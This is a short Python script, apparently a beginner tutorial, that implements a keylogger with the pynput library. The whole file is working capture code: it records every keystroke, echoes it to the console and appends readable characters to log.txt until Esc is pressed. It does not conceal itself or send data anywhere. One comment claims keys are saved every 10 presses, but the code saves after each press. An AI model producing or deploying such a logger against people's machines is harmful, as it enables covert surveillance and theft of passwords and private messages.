import pynput       # monitor and control user input devices

from pynput.keyboard import  Key, Listener      # Listener is going to listen for our key events

count =0    # we are using to count the no. of keys that are pressed but are not stores into the file, bcoz if the user close the program without hitting the esc key, then we will not be able to store it.
keys =[]


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))        # this is just something that is going to put our key into string

    if count >= 1 :                        # this is going to store keys after every 10 keys are present, we can change it to any number
        count =0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open("log.txt","a") as f:              # here "a" means append mode , "w" means wirte file , use "w" when creating file for the first time after that use "a"
        for key in keys :
            k = str(key).replace("'","")        # it is going to remove ' in our output file, so that can become more readable
            if k.find("space")>0:               # it is going to repalce Key.space and Key.backspace with the a new line , as both of them have space in it
                f.write("\n")                   # this is going to write our keys into our file "log.txt"
            elif k.find("Key") == -1 :          # if the key pressed is other than capslock , shift,ctrl,etc.. type of key then we going to store it directly
                f.write(k)                      # it should be a string and not a KeyCode, but we have already converted it into a string above when creating k



def on_release(key):
    if key==Key.esc:            # here esc is escape key
        return False            # this is going to break our loop if we hit escape key

with Listener(on_press= on_press , on_release= on_release)  as listener:    #this function is going to be called when keys are pressed
    listener.join()                                                         # it is going to loop through this function , until we break out of it